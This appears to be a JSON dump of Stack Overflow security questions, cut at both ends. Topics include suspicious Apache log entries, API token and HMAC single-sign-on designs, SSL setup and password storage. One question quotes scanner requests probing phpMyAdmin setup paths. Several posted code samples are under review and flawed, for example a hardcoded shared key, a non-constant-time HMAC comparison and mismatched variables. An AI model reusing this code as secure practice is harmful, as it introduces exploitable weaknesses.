&lt;/managed-bean-scope&gt;\n    &lt;/managed-bean&gt;\n&lt;/faces-config&gt;\n</code></pre>\n"},{"tags":["apache","security","httpwebrequest","phpmyadmin","brute-force"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12454448,"title":"Suspecious requests in apache web server log file","body":"<p>I found the Folowing requests in my apache web server. is these are hack attempts? will it be hamful to server. </p>\n\n<p>My server is crashing frequently and don't have the reasons for It,</p>\n\n<pre><code>GET /muieblackcat HTTP/1.1\" 302 214\nGET //index.php HTTP/1.1\" 302 214\nGET //admin/index.php HTTP/1.1\" 302 214\nGET //admin/pma/index.php HTTP/1.1\" 302 214\nGET //admin/phpmyadmin/index.php HTTP/1.1\" 302 214\n</code></pre>\n\n<blockquote>\n  <p>/user/soapCaller.bs HTTP/1.1\" 302 214</p>\n</blockquote>\n\n<pre><code>GET /robots.txt HTTP/1.0\" 302 214.\n</code></pre>\n\n<p>We see a lot of requests for non-existent setup.php files</p>\n\n<pre><code>GET /phpmyadmin/scripts/setup.php HTTP/1.1\" 302 214\nGET /phpMyAdmin/scripts/setup.php HTTP/1.1\" 302 214\nGET /MyAdmin/scripts/setup.php HTTP/1.1\" 302 214\nGET /myadmin/scripts/setup.php HTTP/1.1\" 302 214\nGET //typo3/phpmyadmin/index.php HTTP/1.1\" 302 214\nGET /pma/scripts/setup.php HTTP/1.1\" 302 214\nGET //phpMyAdmin-2.5.5/index.php HTTP/1.1\" 302 214\n</code></pre>\n\n<p>Below request also accessed in the server. What request is this. <code>95.211.124.232 - - [16/Aug/2012:18:14:52 +0800] \"CONNECT yandex.ru:80 HTTP/1.1\" 302 214</code></p>\n\n<p>Anybody, please help in this to understand the server crash issue.</p>\n"},{"tags":["security","authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12469399,"title":"See any security risks with this approach?","body":"<p>I'm working on a RESTful(ish) API that has the following authentication style:</p>\n\n<ul>\n<li><p>A client calls an \"authenticate\" API method and passes a username and password over HTTPS POST.  This method returns basic account information and a \"client token\", which is stored on the user account in the database.</p></li>\n<li><p>All further API calls (all over HTTPS POST) require a client token.  If the system can't find the requester by client token, the call is rejected.</p></li>\n</ul>\n\n<p>My open questions are:\n1)  Does anyone see a major security problem with this?\n2)  Is there any good reason why I should have client tokens expire over time or change?  Right now I assign a random one to every user.  If the user does a logout or forgot password, I generate a new one.</p>\n\n<p>I'd love to know everyone's thoughts on this approach.  I'm not going for innovation, I'm just making I'm aware of the risks on this approach.</p>\n"},{"tags":["java","security","websphere"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12464205,"title":"Getting NoClassdef on HMAC_SHA1 in Webpshere","body":"<p>We have WAS 6.0 (I know) .2.43 ND running in multiple regions. </p>\n\n<p>Our Dev-B region runs fine, but Dev-C throws a java exception when we make web-calls (at least this is what the developer tells me)...Same code in both regions and I checked the obvious suspects (Global security, SSL ciphers etc) and they all seem to match. Here's the stack trace from SystemErr:</p>\n\n<pre><code>[8/1/12 4:02:31:758 EDT] 0000005c ServletWrappe E   SRVE0068E: Could not invoke the service() method on servlet action. Exception thrown : java.lang.NoClassDefFoundError\n    at javax.crypto.Mac.getInstance(DashoA12275)\n    at net.oauth.signature.HMAC_SHA1.computeSignature(HMAC_SHA1.java:73)\n    at net.oauth.signature.HMAC_SHA1.getSignature(HMAC_SHA1.java:39)\n    at net.oauth.signature.OAuthSignatureMethod.getSignature(OAuthSignatureMethod.java:83)\n    at net.oauth.signature.OAuthSignatureMethod.sign(OAuthSignatureMethod.java:54)\n    at com.harcourt.hsp.utils.LTIUtil.generateSignature(LTIUtil.java:62)\n    at com.harcourt.hsp.web.struts.lti.action.BaseLTIAction.generateSignature(BaseLTIAction.java:238)\n    at com.harcourt.hsp.web.struts.lti.action.BaseLTIAction.execute(BaseLTIAction.java:96)\n    at org.springframework.web.struts.DelegatingActionProxy.execute(DelegatingActionProxy.java:106)\n    at org.apache.struts.action.RequestProcessor.processActionPerform(RequestProcessor.java:419)\n    at org.apache.struts.action.RequestProcessor.process(RequestProcessor.java:224)\n    at org.apache.struts.action.ActionServlet.process(ActionServlet.java:1194)\n    at org.apache.struts.action.ActionServlet.doGet(ActionServlet.java:414)\n    at javax.servlet.http.HttpServlet.service(HttpServlet.java:743)\n    at javax.servlet.http.HttpServlet.service(HttpServlet.java:856)\n    at com.ibm.ws.webcontainer.servlet.ServletWrapper.service(ServletWrapper.java:1796)\n    at com.ibm.ws.webcontainer.servlet.ServletWrapper.handleRequest(ServletWrapper.java:887)\n    at com.ibm.ws.webcontainer.servlet.CacheServletWrapper.handleRequest(CacheServletWrapper.java:90)\n    at com.ibm.ws.webcontainer.WebContainer.handleRequest(WebContainer.java:1937)\n    at com.ibm.ws.webcontainer.channel.WCChannelLink.ready(WCChannelLink.java:130)\n    at com.ibm.ws.http.channel.inbound.impl.HttpInboundLink.handleDiscrimination(HttpInboundLink.java:434)\n    at com.ibm.ws.http.channel.inbound.impl.HttpInboundLink.handleNewInformation(HttpInboundLink.java:373)\n    at com.ibm.ws.http.channel.inbound.impl.HttpInboundLink.ready(HttpInboundLink.java:253)\n    at com.ibm.ws.tcp.channel.impl.NewConnectionInitialReadCallback.sendToDiscriminaters(NewConnectionInitialReadCallback.java:207)\n    at com.ibm.ws.tcp.channel.impl.NewConnectionInitialReadCallback.complete(NewConnectionInitialReadCallback.java:109)\n    at com.ibm.ws.tcp.channel.impl.WorkQueueManager.requestComplete(WorkQueueManager.java:566)\n    at com.ibm.ws.tcp.channel.impl.WorkQueueManager.attemptIO(WorkQueueManager.java:619)\n    at com.ibm.ws.tcp.channel.impl.WorkQueueManager.workerRun(WorkQueueManager.java:952)\n    at com.ibm.ws.tcp.channel.impl.WorkQueueManager$Worker.run(WorkQueueManager.java:1039)\n    at com.ibm.ws.util.ThreadPool$Worker.run(ThreadPool.java:1498)\n\n    at javax.crypto.Mac.getInstance(DashoA12275)\n    at net.oauth.signature.HMAC_SHA1.computeSignature(HMAC_SHA1.java:73)\n    at net.oauth.signature.HMAC_SHA1.getSignature(HMAC_SHA1.java:39)\n    at net.oauth.signature.OAuthSignatureMethod.getSignature(OAuthSignatureMethod.java:83)\n    at net.oauth.signature.OAuthSignatureMethod.sign(OAuthSignatureMethod.java:54)\n    at com.harcourt.hsp.utils.LTIUtil.generateSignature(LTIUtil.java:62)\n    at com.harcourt.hsp.web.struts.lti.action.BaseLTIAction.generateSignature(BaseLTIAction.java:238)\n    at com.harcourt.hsp.web.struts.lti.action.BaseLTIAction.execute(BaseLTIAction.java:96)\n    at org.springframework.web.struts.DelegatingActionProxy.execute(DelegatingActionProxy.java:106)\n    at org.apache.struts.action.RequestProcessor.processActionPerform(RequestProcessor.java:419)\n    at org.apache.struts.action.RequestProcessor.process(RequestProcessor.java:224)\n    at org.apache.struts.action.ActionServlet.process(ActionServlet.java:1194)\n    at org.apache.struts.action.ActionServlet.doGet(ActionServlet.java:414)\n    at javax.servlet.http.HttpServlet.service(HttpServlet.java:743)\n    at javax.servlet.http.HttpServlet.service(HttpServlet.java:856)\n    at com.ibm.ws.webcontainer.servlet.ServletWrapper.service(ServletWrapper.java:1796)\n    at com.ibm.ws.webcontainer.servlet.ServletWrapper.handleRequest(ServletWrapper.java:887)\n    at com.ibm.ws.webcontainer.servlet.CacheServletWrapper.handleRequest(CacheServletWrapper.java:90)\n    at com.ibm.ws.webcontainer.WebContainer.handleRequest(WebContainer.java:1937)\n    at com.ibm.ws.webcontainer.channel.WCChannelLink.ready(WCChannelLink.java:130)\n    at com.ibm.ws.http.channel.inbound.impl.HttpInboundLink.handleDiscrimination(HttpInboundLink.java:434)\n    at com.ibm.ws.http.channel.inbound.impl.HttpInboundLink.handleNewInformation(HttpInboundLink.java:373)\n    at com.ibm.ws.http.channel.inbound.impl.HttpInboundLink.ready(HttpInboundLink.java:253)\n    at com.ibm.ws.tcp.channel.impl.NewConnectionInitialReadCallback.sendToDiscriminaters(NewConnectionInitialReadCallback.java:207)\n    at com.ibm.ws.tcp.channel.impl.NewConnectionInitialReadCallback.complete(NewConnectionInitialReadCallback.java:109)\n    at com.ibm.ws.tcp.channel.impl.WorkQueueManager.requestComplete(WorkQueueManager.java:566)\n    at com.ibm.ws.tcp.channel.impl.WorkQueueManager.attemptIO(WorkQueueManager.java:619)\n    at com.ibm.ws.tcp.channel.impl.WorkQueueManager.workerRun(WorkQueueManager.java:952)\n    at com.ibm.ws.tcp.channel.impl.WorkQueueManager$Worker.run(WorkQueueManager.java:1039)\n    at com.ibm.ws.util.ThreadPool$Worker.run(ThreadPool.java:1498)\n</code></pre>\n\n<p>Thanks for your help. I'm sure it's a config that I'm missing. </p>\n"},{"tags":["android","iphone","security","mobile","ssl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":199,"score":2,"question_id":8734893,"title":"SSL for mobile game","body":"<p>I'm designing the server backend for a mobile game. iPhones and Androids interact with my PHP scripts on a linux server to make API calls. </p>\n\n<p>Basically the phones \"know\" their game id when they sign up (they are assigned one) and now that's what I'm using to authenticate. For example, if a user's phone is the moderator of the game (if their id is associated with an entry in the moderator table), they could edit the rules for that game, etc. </p>\n\n<p>However, it occurs to me this is not secure. Someone could easily craft HTTP POST calls to my script and cheat at the game. </p>\n\n<p>I have decided to implement SSL to encrypt messages going back and forth between phones and server. How do I find out what type of SSL certs to buy? Where can I learn to set one up? I have no experience with this. Any advice from some seasoned mobile developers on what is best/easiest/most cost effective would be beyond great. </p>\n"},{"tags":["php","security","api","file-upload","signature"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12463264,"title":"Signing an API request for a file upload?","body":"<p>When I developed <a href=\"http://www.waveframework.com\" rel=\"nofollow\">Wave Framework</a>, I put a lot of attention on the security model for API requests. I had to make sure that the API requests can be made over HTTP from where-ever possible while at the same time secure against potential middle-man attacks, data tampering and more.</p>\n\n<p>I ended up essentially building a GET string from the input data and generating a SHA-1 hash from it while salting it with API profile secret key. This works really well and protects the API as much as I need.</p>\n\n<p>But my API also allows for things such as file uploads over HTTP. At the moment I am ignoring file upload related data entirely (I use it for cache signature but not for data validation). This means that a malicious middle man could technically change file contents as it is being transferred.</p>\n\n<p>Are there any alternatives? Sure I could implement this when files are sent server side (such as calculate file contents as part of the validation hash), but that is not an option if the upload is through web browser and initiated through JavaScript?</p>\n\n<p>How have other frameworks handled this? I've tried to search but could not find enough information. Thanks!</p>\n"},{"tags":["security","web-applications","web","user"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":125,"score":4,"question_id":12463939,"title":"Reducing account sharing","body":"<p>We have a site where customers (a company) will purchase X user licenses for their employees. One of the big, recurring problems we have is account sharing within these companies. </p>\n\n<p>We've taken some steps already to alleviate some of this:</p>\n\n<ul>\n<li>We limit users to 1 sessionid at a time (forcibly logging out the old one)</li>\n<li>We routinely force the user to change their password (every 4 months)</li>\n<li>There are a few prompts around the site and e-mails we send out reminding users that sharing is not caring</li>\n<li>When caught, we try to \"educate\" them not to do it again</li>\n</ul>\n\n<p>But these measures haven't even put a dent in the problem. Many users, especially at small companies (who purchase 1 license and share w/ 5-10 people) simply coordinate with each other to not use the site at the same time. Understandably, the individual employees don't care, and just want to do their job.</p>\n\n<p>Management is asking us to come up with something to solve it. </p>\n\n<ul>\n<li><p>Most logins are from one building with one IP address. So we can't simply detect by IP.</p></li>\n<li><p>Most users work close by, so they can quickly share information (passwords can be e-mailed, texted, called, or just told to the person sitting next to them)</p></li>\n<li><p>Is there a way to get the MAC address and use that? We could just limit users to 2 or 3 devices at a time (to account for laptops &amp; tablets)</p></li>\n<li><p>Or maybe use some JavaScript/Cookie combination?</p></li>\n</ul>\n\n<p>Management is actually considering requiring us to send a text message to their mobile for validation every 3 or 4 days. Because we know how much of a hassle that will be, we'd like to have something nicer instead.</p>\n\n<p>Does anyone else run a site w/ similar user conditions? How do you handle the problem?</p>\n"},{"tags":["security","amazon-web-services"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12465978,"title":"Can AWS security groups on one AWS account reference security groups in another?","body":"<p>For example, I have a main company AWS account one with security group-xxxxx.  Now I have my personal aws with security group-yyyyy.  The accounts are not related at all.  Can I add accept group-yyyyy into the group-xxxxx thereby allowing my personal instances to access the companies instances?</p>\n"},{"tags":["php","security","file"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":44,"score":2,"question_id":12464119,"title":"Secure image downloading","body":"<p>I have been researching securely uploading images, and it has become apparent that actually serving the images is where most of the risk is for rogue PHP files that could compromise the server.</p>\n\n<p>Many are suggesting that having a image processing script e.g getimage.php?i=575748 which would lookup in the database 575748 and actually return myphoto.jpg (whithout the user knowing the location of the origional image) is much more secure.</p>\n\n<p>Can any point me in the right direction of what sort of things I should be implementing in the script? I know setting the content type headers is a must, but is this enough to stop code executing?</p>\n\n<p>Thanks!</p>\n"},{"tags":["c++","security"],"answer_count":7,"favorite_count":4,"up_vote_count":13,"down_vote_count":0,"view_count":9533,"score":13,"question_id":1107705,"title":"System(\"pause\"); - Why is it wrong?","body":"<p>Here's a question that I don't quite understand:</p>\n\n<p>The command, System(\"pause\"); is taught to new programmers as a way to pause a program and wait for a keyboard input to continue. However, it seems to be frowned on by many veteran programmers as something that should not be done in varying degrees.</p>\n\n<p>Some people say it is fine to use. Some say it is only to be used when you are locked in your room and no one is watching. Some say that they will personally come to your house and kill you if you use it. </p>\n\n<p>I, myself am a new programmer with no formal programming training. I use it because I was taught to use it. What I don't understand is that if it is not something to be used, then why was I taught to use it? Or, on the flip side, is it really not that bad after all?</p>\n\n<p>What are your thoughts on this subject?</p>\n"},{"tags":["ruby-on-rails","django","security","passwords","environment-variables"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":134,"score":3,"question_id":12461484,"title":"Is it secure to store passwords as environment variables (rather than as plain text) in config files?","body":"<p>I work on a few apps in rails, django (and a little bit of php), and one of the things that I started doing in some of them is storing database and other passwords as environment variables  rather than plain text in certain config files (or in settings.py, for django apps).</p>\n\n<p>In discussing this with one of my collaborators, he suggested this is a poor practice - that perhaps this isn't as perfectly secure as it might at first seem.</p>\n\n<p>So, I would like to know - is this a secure practice? Is it more secure to store passwords as plain text in these files (making sure, of course, not to leave these files in public repos or anything)?</p>\n"},{"tags":["javascript","web-services","security","api"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":37,"score":2,"question_id":12462834,"title":"ensuring that a script is only included into certain pages","body":"<h1>The question</h1>\n\n<p>I have a service that pushes content to users. To provide this content to their users, customers will include a script on their site. Their script sends a token to my server to identify which customer it is, but here's the problem: if anyone copies the script from the user's site, they can receive this live content, and the customer is billed for users that are not on their site. So, is there a way to ensure that the script is only included on their website? How does google analytics achieve this? </p>\n\n<p>I have an idea, but I don't know if this would be completely secure.</p>\n\n<ol>\n<li>The customer tells me any domains (including subdomains) that they would like to include my script on.</li>\n<li>I give the user a very small text file that they store on their servers.</li>\n<li>Once my script is loaded, it checks for window.location.host, and tries to fetch the text file from the root of the hosting domain.</li>\n<li>If the file is found, and the contents match the content I generated when I gave the customer the file, I activate the service.</li>\n</ol>\n\n<p>would this work?</p>\n\n<h1>Why I can not use window.location</h1>\n\n<p>Let's say that my script reads window.location, and sends that to the url <code>mydomain.com?token=ABC&amp;locationhost=goodcustomer.com</code></p>\n\n<p>Now, the owner of baduser.com wants to abuse the account of gooduser.com, so he includes gooduser.com's script. The script now sends an ajax request to <code>mydomain.com?token=ABC&amp;locationhost=badcustomer.com</code></p>\n\n<p>This would not start the service, because badservice.com is not the domain that the owner of goodcustomer.com entered when he signed up. This is easy to circumvent, because badcustomer.com's owner can take a look at my script, notice that it is sending a request to validate the url, and just send his own request. So he would send a request to <code>mydomain.com?token=ABC&amp;locationhost=goodcustomer.com</code>. My server sees this request, compares the locationhost to the domain associated with the token, and starts giving the content meant for goodcustomer.com's users, to badcustomer.com's users. My server has no way of knowing wether the request was sent by my own script, or by a user trying to impersonate the actual customer.</p>\n"},{"tags":["security","magento","ssl","https","media"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12456237,"title":"HTTPS Failing on Media in Magento","body":"<p>I'm having a problem with a clients magento site that has https enabled on the secure pages,</p>\n\n<p>The website it built heavily around static block content and on the https pages images are pulled from static blocks (over 400 of them) using the media insert in the static block {{media url=\"media/bla/bla/bob.png\"}} these images are comign through as <a href=\"http://site.com/media/bla/bla/bob.png\" rel=\"nofollow\">http://site.com/media/bla/bla/bob.png</a> </p>\n\n<p>its not realistic, and it wouldn't make any sense to go through and change all these links to direct links.</p>\n\n<p>Any ideas?</p>\n\n<p>Cheers</p>\n"},{"tags":["wcf","security","ssl","username",".net-cf-3.5"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12459642,"title":"WCF + .NET CF + Security with SSL and Username","body":"<p><strong>I have:</strong> An IIS7 Server (WCF must be used) and a WindowsMobile 6.1 device (.NET CF must be used)\n<br><strong>I want:</strong> Secure communication between them with a username/password authentication over WCF.</p>\n\n<p><strong>My ideas:</strong> I started with an SSL connection with selfcreated certificates which works fine. As SSL is not enough (I have to identify users to add/remove functions matching their specific rights) To do so, my current approach is to use \"TransportWithMessageCredential\" with 'clientCredentialType=\"UserName\"' which should work, as far as I understood the few capabilites .NET CF has.</p>\n\n<p>However, I am not able to make this work. I get an exception that says:</p>\n\n<blockquote>\n  <p>security protocol cannot verify incoming message</p>\n</blockquote>\n\n<p>Now some code:</p>\n\n<p><strong>server web.config:</strong></p>\n\n<pre><code>&lt;services&gt;\n      &lt;service name=\"TestWcfService.Service1\" behaviorConfiguration=\"TestServiceBehavior\"&gt;\n        &lt;endpoint address=\"\" binding=\"basicHttpBinding\" bindingConfiguration=\"httpEndpointBinding\" name=\"TestServiceEndpoint\" contract=\"TestWcfService.IService1\"&gt;\n          &lt;identity&gt;\n            &lt;dns value=\"https://localhost\"/&gt;\n          &lt;/identity&gt;\n        &lt;/endpoint&gt;\n      &lt;/service&gt;\n    &lt;/services&gt;\n\n    &lt;bindings&gt;\n      &lt;basicHttpBinding&gt;\n        &lt;binding name=\"httpEndpointBinding\"&gt;\n          &lt;security mode=\"TransportWithMessageCredential\"&gt;\n            &lt;transport clientCredentialType=\"None\" proxyCredentialType=\"None\"\n                            realm=\"\" /&gt;\n            &lt;message clientCredentialType=\"UserName\" \n                     algorithmSuite=\"Default\" /&gt;\n\n          &lt;/security&gt;\n        &lt;/binding&gt;\n      &lt;/basicHttpBinding&gt;\n    &lt;/bindings&gt;\n\n    &lt;behaviors&gt;\n      &lt;serviceBehaviors&gt;\n        &lt;behavior name=\"TestServiceBehavior\"&gt;\n          &lt;serviceMetadata httpGetEnabled=\"true\"/&gt;\n          &lt;serviceDebug includeExceptionDetailInFaults=\"true\"/&gt;\n          &lt;serviceCredentials&gt;\n            &lt;serviceCertificate findValue=\"ComapCA\" storeLocation=\"LocalMachine\" storeName=\"My\" x509FindType=\"FindBySubjectName\" /&gt;\n            &lt;userNameAuthentication userNamePasswordValidationMode=\"Custom\" customUserNamePasswordValidatorType=\"TestWcfService.CoreUserNamePasswordValidator, TestWcfService\"/&gt;\n          &lt;/serviceCredentials&gt;\n        &lt;/behavior&gt;\n      &lt;/serviceBehaviors&gt;\n    &lt;/behaviors&gt;\n</code></pre>\n\n<p><strong>client side (using proxy imported by web reference):</strong></p>\n\n<pre><code>TestWcfService.Service1 serviceCon = new TestWcfService.Service1();\nserviceCon.Credentials = new NetworkCredential(\"nb\",\"12345\");\nserviceCon.PreAuthenticate = true;\nMessageBox.Show(serviceCon.GetData(4711, true));\n</code></pre>\n\n<p>The GetData test function is the one that works with only SSL.</p>\n"},{"tags":["windows","security","visual-c++","installer","code-signing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12459335,"title":"User gets \"publisher not verified\" message when downloading my installer .exe - how can I avoid this?","body":"<p>I've created an installer .exe for my app and made it available for download.  When users download it they end up getting a message from Windows about the \"publisher not verified\".  I'd like to see what is required to get rid of this.</p>\n\n<p>I found articles indicating that different system settings would avoid it, however, I don't want to require users to change any settings.  I'd rather see what I need to do on my end to avoid them from seeing the message in the first place.</p>\n\n<p>I'm sure the answer has something to do with code signing, however, in order to sign my code doesn't that also mean I have to be Windows logo-certified?  Not sure I want to go through that.  Or is that a separate thing?  Is there a way to sign it without being logo-certified?</p>\n"},{"tags":["security"],"answer_count":8,"favorite_count":7,"up_vote_count":17,"down_vote_count":0,"view_count":1370,"score":17,"question_id":215306,"title":"Storing Personal Information Dos and Don'ts","body":"<p>I run a small php/mysql website for a camera club where users can upload photos. I have recently started storing email addresses for doing password resets. </p>\n\n<p>My question is what is the best practice for dealing with users' personal information: are there any laws/legislation regarding what I can do with personal information? Do I need to display my policy for dealing with personal information?</p>\n\n<p>Any further information regarding this subject is greatly received.</p>\n\n<p>Thanks</p>\n"},{"tags":["java","database","security","encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12453594,"title":"How would I go about connecting to a database securely via Java?","body":"<p>I wish to connect to a Mysql Database with Java without revealing the password to anyone that may decompile my code? I can efficiently connect to a database, but my ways will openly show my password in the code :( and wish only a response on how to hide the password. Thanks is advance, Josh Aurora</p>\n"},{"tags":["security","rabbitmq"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12384515,"title":"RabbitMQ - Creating and managing users dynamically in real-time","body":"<p>We're evaluating RabbitMQ for a context where many different users would connect to it and have the following questions:</p>\n\n<ol>\n<li>Is it feasible to create a RabbitMQ user and set his permissions at runtime for each user of our system that wants to connect to Rabbit and delete this RabbitMQ user after his session is terminated?</li>\n<li>Even if we have thousands or even millions of users connecting in high volumes?</li>\n<li>If so, should we use the RabbitMQ Management API (REST)?</li>\n<li>Instead of enforcing security through RabbitMQ's User and ACL system, should we rather provide each user with an exclusive Exchange with a random (some kind of session key) name that can't be guessed by other the other users?</li>\n</ol>\n\n<p>Thanks in advance.</p>\n\n<p><strong>Edit - Clarification</strong></p>\n\n<p>Each user that connects to our system should only be able to write to and read from certain dynamically created queues or exchanges. We don't want unauthorized users to be able to subscribe to other people's queues. Also, we might allow anonymous users connecting to our system but they must adhere to the same security rules.</p>\n\n<p>The solutions we found are:</p>\n\n<ul>\n<li>Use RabbitMQ's authentication and authorization system. We're not sure that it was designed to be this dynamic. Or was it?</li>\n<li>Create some kind of session for each user and use that random session key to name the user's exchange and/or queues. This way, only the user will know to which queues it should subscribe. It sounds secure enough for our needs. Is this the better approach?</li>\n</ul>\n"},{"tags":["java","security","hash","md5","md5sum"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":63,"score":0,"question_id":12457359,"title":"JAVA Md5 returning non-deterministic results","body":"<p>I have written following function to compute Md5 checksum in Java.</p>\n\n<pre><code>class Utils {\n public static String md5Hash(String input) {\n        String result = \"\";\n        try {\n            System.out.println(\"Input=\" + input);\n            final MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            md.reset();\n            md.update(input.getBytes());\n            result = md.digest().toString();\n        } catch (Exception ee) {\n            System.err.println(\"Error computing MD5 Hash\");\n        }\n        return result;\n    }\n};\n</code></pre>\n\n<p>Calling <code>Utils.md5Hash(\"abcde\")</code>  multiple times gives different results. My understanding says md5 returns a deterministic and unique checksum for a string. Is that wrong? Else please let me know the bug in my implementation. Thanks</p>\n"},{"tags":["php","security",".htaccess","browser"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":645,"score":1,"question_id":8772094,"title":"show file list in folder from using browser","body":"<p>Normally if there is no htacces restriction is enabled it is possible to view the list of files under a folder hosted in web server using browsers. Except  if there exist a index file like index.php it automatically go to the index page. (as far i know)  </p>\n\n<p>But is it possible to see the list of files though there exist an index file ?</p>\n\n<p>thanks in advance </p>\n"},{"tags":["php","security","hash","single-sign-on","hmac"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12456313,"title":"Is this the correct way to implement a HMAC token system?","body":"<p>I'm architecting a basic SSO solution to pass a user between two sites. </p>\n\n<p>Site A handles authentication against a user database and then generates links to Site B which pass a HMAC token comprising a nonce and the user's ID. The HMAC is hashed with a shared secret between the two sites.</p>\n\n<p>The following shows the token generation. </p>\n\n<pre><code>&lt;?php\n\n$sso['nonce'] = hash('sha1', rand() );\n$sso['sharedKey'] = 'someVerySecureString';\n$sso['hmacKey'] = hash_hmac ( 'sha256', $test['sharedKey'] , $test['nonce'] );\n$sso['userId'] = '123456';\n$sso['hmac'] = hash_hmac ( 'sha256', $test['userId'] , $test['hmacKey'] );\n$sso['url'] = '/?id=' . urlencode($test['userId']) . '&amp;nonce=' . urlencode($test['nonce']) . '&amp;hmac=' . urlencode($test['hmac']);\n</code></pre>\n\n<p>I'm using the nonce to HMAC the key before transmission.</p>\n\n<p>This is the code on Site B to validate the token:</p>\n\n<pre><code>function validateSSOToken($sharedKey='someVerySecureString') {\n\n    $isValid = false;\n\n    if ( isset( $_GET['id'] ) \n      &amp;&amp; isset( $_GET['nonce'] ) \n      &amp;&amp; isset( $_GET['hmac'] ) \n      &amp;&amp; strlen( $_GET['nonce'] ) == 40 \n      &amp;&amp; strlen( $_GET['hmac'] ) == 64) {\n\n        $userId = $_GET['id'];\n        $nonce = $_GET['nonce'];\n        $hmac = $_GET['hmac'];\n\n        // Sign the key with the nonce to get the tmp key\n        $hmacKey = hash_hmac ( 'sha256', $sharedKey, $nonce );\n\n        // rebuild the string to sign\n        $localHmac = hash_hmac ( 'sha256', $userId , $hmacKey );\n\n        // Compare against the incoming key\n        $isValid = $localHmac == $hmac ? true : false;\n\n    } \n    return $isValid;\n}\n</code></pre>\n\n<p>Could you advise if this is secure? Is there anything else I might look at considering to achieve the same goal?</p>\n\n<p>Thanks</p>\n\n<p>Rob</p>\n"},{"tags":["java","security","jsp","servlets","web"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12442960,"title":"Java Web Application Security Idea","body":"<p>I search a lot in Google and Stackoverflow about web application security in Java but I can not understand which one is best pattern for my web application.</p>\n\n<p>I want to use JSP/Servlet and my web server is Tomcat .</p>\n\n<p>Web application security is very important for us but I really did not know what I have to ? or What is the Best way ?!</p>\n\n<p>I studied about Tomcat Realm , Acegi , Spring Security ..... </p>\n\n<p>Thank you.</p>\n"},{"tags":["wcf","security","header"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12426594,"title":"Apply security header with proxy?","body":"<p>I have a custrom soapheader that looks like this : </p>\n\n<pre><code>[DataContract()]\n    public class IntegrationHeader\n    {\n        [DataMember]\n        public string UserName;\n        [DataMember]\n        public string Password;\n    }\n</code></pre>\n\n<p>Then I have the following code in a messageInspector : </p>\n\n<pre><code>if (request.Headers.Action == null || request.Headers.Action.ToString().Length &lt; 1)\n                return null;\n\n            foreach (var header in request.Headers)\n            {\n                if (header.Namespace == \"ns\" &amp;&amp; header.Name == \"SecurityToken\")\n                {\n                    loginHandler = new LoginHandler();\n\n                    integrationHeader = request.Headers.GetHeader&lt;IntegrationHeader&gt;(header.Name, header.Namespace);\n                    if ((userContext = loginHandler.LoginUser(integrationHeader.UserName, PassWordManager.DESEncrypt(integrationHeader.Password), Business.Entity.LoginType.Regular)) == null)\n                        throw new SecurityTokenException(\"Unknown username or invalid password\");\n\n                    Thread.CurrentPrincipal = userContext;\n\n                    return null;\n                }\n            }\n\n            throw new SecurityTokenException(\"Unknown username or invalid password\");\n</code></pre>\n\n<p>When sending the following soap header with soapui it works fine : </p>\n\n<pre><code>   &lt;soapenv:Header&gt;\n     &lt;SecurityToken xmlns=\"ns\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;\n       &lt;Password xmlns=\"MyApp.ServiceImplementation\"&gt;X&lt;/Password&gt;\n       &lt;UserName xmlns=\"MyApp.ServiceImplementation\"&gt;X&lt;/UserName&gt;\n     &lt;/SecurityToken&gt;\n   &lt;/soapenv:Header&gt;\n</code></pre>\n\n<p>Then I try to do this from within a proxy generated WCF client : </p>\n\n<p>using (client = new MyProxy())\n                {</p>\n\n<pre><code>                IntegrationHeader ih = new IntegrationHeader { UserName = \"X\", Password = \"X\" };\n\n                MessageHeader untyped = MessageHeader.CreateHeader(\"SecurityToken\", \"ns\", ih);\n                using (new System.ServiceModel.OperationContextScope(client.InnerChannel))\n                {\n                    OperationContext.Current.OutgoingMessageHeaders.Add(untyped);\n                }\n\n                client.GetData(request);\n            }\n</code></pre>\n\n<p>The problem is that there will be only 2 headers in the messageInspector when running this code and none of them will be the security header?</p>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["java","security","ssl","active-directory","weblogic"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":336,"score":1,"question_id":11960021,"title":"Intermittent SSL handshake error","body":"<p>We have an issue with SSL and I am 99% this is not your usual certificates trust store merry-go-round.</p>\n\n<p>We have a Weblogic server trying to make SSL connections to Active Directory via LDAPS, underlying SSL implementation is the JSSE.</p>\n\n<p>Some of the time, it works. Usually for a few hours after restarting Weblogic.</p>\n\n<p>After which we start getting SSL Handshake errors, with SSL debug turned on we 